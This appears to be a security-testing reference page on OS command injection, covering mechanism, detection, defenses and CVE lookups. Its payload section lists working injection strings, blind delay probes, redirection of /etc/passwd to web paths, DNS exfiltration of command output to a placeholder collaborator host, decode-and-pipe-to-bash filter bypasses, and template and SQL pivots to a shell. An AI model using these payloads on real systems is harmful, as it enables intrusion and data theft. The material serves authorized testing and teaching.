# OS Command Injection

> Untrusted input reaches a shell, letting an attacker run system commands. **Deep dive:** [`Troubleshooting_Guide/os_comand.md`](../../../../Troubleshooting_Guide/os_comand.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** Command Injection · A03:2021 Injection
**Status:** complete

## What it is
OS command injection happens when an application passes attacker-controlled input into a system
shell, letting the attacker run arbitrary commands on the host. It typically arises wherever the
app shells out to a utility (ping, ImageMagick, a backup script) and builds the command line from
user input.

## How it works
The application constructs a command string and hands it to a shell (`system()`, `exec()`,
`Runtime.exec` with a shell, `child_process.exec`, backticks). Because the shell interprets
metacharacters — `;`, `|`, `&&`, `||`, `` ` ``, `$()`, newlines — input that contains them is no
longer just an argument: it terminates the intended command or chains a new one. The attacker
controls part of the command line; the app fails by concatenating untrusted data into a string
the shell parses; execution breaks out of the intended single command.

## Impact
Arbitrary command execution as the web/service account, which commonly leads to full host
compromise: reading and exfiltrating files, planting webshells, lateral movement, and using the
host as a pivot. This is among the most severe web vulnerabilities — almost always critical.

## How to detect
- Appending a separator plus a benign command (e.g. `1|whoami`, `1$(whoami)`) returns the
  command's output in the response.
- Blind cases: a `sleep`/`ping`/`timeout` payload introduces a measurable, proportional delay, or
  a DNS/HTTP callback reaches a controlled collaborator host.
- Error messages or stack traces revealing a shell invocation, or unexpected output when
  metacharacters are submitted.

## Exploitation (summary)
Choose a separator the target shell honours and append a command — start with a harmless probe
(`whoami`, `id`). When output is reflected, read it directly; when it is blind, confirm execution
via time delays or out-of-band DNS, then exfiltrate by encoding command output into subdomains or
writing to a web-reachable path. Filters are bypassed with whitespace substitutes (`$IFS`), globbing,
keyword obfuscation, and runtime decoding. Full payloads are in the Payloads section and deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Command separators by platform
Pick a separator the target shell honours; append a benign command (`whoami`) to a legitimate parameter value.

| Separator | Linux/Unix | Windows |
|-----------|:---:|:---:|
| `\|` (pipe) | `1\|whoami` | `1\|whoami` |
| `;` | `1;whoami` | — |
| `&` | — | `1&whoami` |
| `&&` | `1&&whoami` | `1&&whoami` |
| `\|\|` | `1\|\|whoami` | `1\|\|whoami` |
| backtick | ``1`whoami` `` | — |
| `$()` | `1$(whoami)` | — |
| newline `%0a` | `1%0awhoami` | `1%0awhoami` |

### Simple injection (output reflected)
When command output is echoed back in the response.

```bash
1|whoami
1;whoami
1&&whoami
1||whoami
1`whoami`
1$(whoami)
```

### Blind — time-delay detection
No output returned; confirm execution by measuring response latency.

```bash
# Linux
x||sleep 10||
x;sleep 10;
x`sleep 10`

# Windows
x||timeout 10||
x&ping -n 10 127.0.0.1&
```

### Blind — output redirection
Write command output to a web-reachable path, then fetch it.

```bash
||whoami>/var/www/images/output.txt||
||id>/var/www/images/out.txt||
x;cat /etc/passwd>/var/www/images/passwd.txt;
||ls -la />/var/www/images/listing.txt||
# retrieve: GET /image?filename=output.txt
```

### Blind — out-of-band (DNS) detection & exfiltration
Trigger a DNS lookup to a controlled collaborator host; embed command output in the subdomain to exfiltrate.

```bash
# detection
x||nslookup BURP-COLLABORATOR||
||dig BURP-COLLABORATOR||
||host BURP-COLLABORATOR||
x`nslookup BURP-COLLABORATOR`

# data exfiltration
||nslookup $(whoami).BURP-COLLABORATOR||
||nslookup $(hostname).BURP-COLLABORATOR||
||nslookup $(pwd|tr '/' '-').BURP-COLLABORATOR||
||nslookup $(cat /etc/passwd | base64 | tr -d '\n').BURP-COLLABORATOR||
```

### Filter bypass — whitespace
When spaces are stripped or blocked.

```bash
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
```

### Filter bypass — slash / path globbing
When `/` or full paths are filtered, use wildcards or indirection.

```bash
cat /et?/passw?
cat /etc/pass*
cat $(echo /etc/passwd)
```

### Filter bypass — keyword obfuscation
When a command name (e.g. `cat`) is blacklisted, break it up with quotes, escapes, or absolute paths.

```bash
c\at /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
$(printf 'cat') /etc/passwd
ca''t /etc/passwd
\c\a\t /etc/passwd
/bin/cat /etc/passwd
/usr/bin/cat /etc/passwd
```

### Filter bypass — encoding
Smuggle the command past filters by decoding at runtime.

```bash
# base64 -> cat /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# hex -> cat /etc/passwd
echo "63617420 2f6574632f706173737764" | xxd -r -p | bash

# URL-encoded "cat /etc/passwd"
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

### Filter bypass — quote/context escape
Break out of a surrounding quoted string before injecting.

```bash
';whoami;'
";whoami;"
username';whoami;'
email";id;"
```

### Reaching the shell via other injection classes
Pivots from template or SQL injection into OS command execution.

```python
# Jinja2 SSTI -> shell
{{''.__class__.__mro__[1].__subclasses__()[414]('whoami',shell=True,stdout=-1).communicate()}}
```

```sql
-- MySQL
SELECT sys_exec('whoami');
SELECT load_file('/etc/passwd');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'whoami';

-- MSSQL
EXEC xp_cmdshell 'whoami';
```

## Defenses
1. **Avoid the shell entirely** — call the target binary via an argument-array API
   (`execve`, `subprocess.run([...], shell=False)`, `ProcessBuilder`) so input is passed as
   discrete arguments, never parsed for metacharacters (the primary fix).
2. **Prefer native language/library functions** over shelling out where one exists.
3. If a shell is unavoidable, **allow-list** the exact permitted values and strictly validate
   input against a tight pattern; do not rely on blacklisting metacharacters.
4. Run the process with **least privilege** and in a sandbox/container to limit blast radius.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=OS+Command+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=OS+Command+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=OS+Command+Injection
- **GitHub Advisories** — https://github.com/advisories?query=OS+Command+Injection
- **OSV** — https://osv.dev/list?q=OS+Command+Injection
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `OS Command Injection <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2014-6271` — "Shellshock," command injection via crafted environment variables parsed by
  Bash; exploited at scale against CGI endpoints.
- `CVE-2021-44228` — "Log4Shell," JNDI lookup leading to remote code execution (an injection-class
  RCE frequently chained with command execution).
- `CVE-2017-9841` — PHPUnit `eval-stdin.php` remote command execution, widely scanned and exploited.

## References
- PortSwigger Web Security Academy — OS command injection.
- OWASP — OS Command Injection Defense Cheat Sheet.
- OWASP — Command Injection (WSTG / Attacks reference).
